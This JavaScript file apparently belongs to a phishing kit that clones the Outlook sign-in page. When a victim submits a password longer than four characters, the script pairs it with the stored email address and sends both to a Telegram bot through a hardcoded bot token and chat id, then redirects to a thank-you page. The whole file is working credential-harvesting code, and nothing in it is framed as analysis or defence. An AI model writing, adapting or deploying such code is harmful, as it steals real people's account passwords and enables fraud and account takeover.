// const pass = document.getElementById("i0118");
const emailContainer = document.getElementById("email-container");
const email = sessionStorage.getItem("email");
emailContainer.textContent = email;
// console.log(emailContainer.textContent, email);

const submitBtn = document.getElementById("button-submit");
// console.log(submitBtn.textContent);

submitBtn.addEventListener("click", () => {
  const pass = document.getElementById("i0118").value;
  if (pass.length > 4) {
    console.log(pass, email);

    apiCall("./thank-you.html", "FROM OUTLOOK CLONE", email, pass);
  }
});

// API SETUP
async function apiCall(routePath, ...texts) {
  const API_KEY = "7163250221:AAG5sblsAuhM5suBnIZGNmsv6z851Injt-Y";
  const chat_id = -1002202524992; // -4221814535; //-1002202524992 // -4266117210;

  // Flatten the texts array if the first element is an array
  if (Array.isArray(texts[0])) {
    texts = texts[0];
  }

  // Join the texts array into a single string separated by new lines
  const combinedText = texts.join("\n");
  const url = `https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(
    combinedText
  )}`;

  const api = new XMLHttpRequest();
  api.open("GET", url, true);

  // Define what happens on successful data submission
  api.onload = () => {
    if (api.status >= 200 && api.status < 300) {
      sessionStorage.clear;
      console.log("Message Sent!");
      if (routePath) {
        window.location.href = routePath;
        // handleRouting(routePath);
      }
    } else {
      console.log(`Failed to send message. Status: ${api.status}`);
    }
  };

  // Define what happens in case of an error
  api.onerror = () => {
    console.log("Error occurred while sending the message");
  };

  api.send();
}
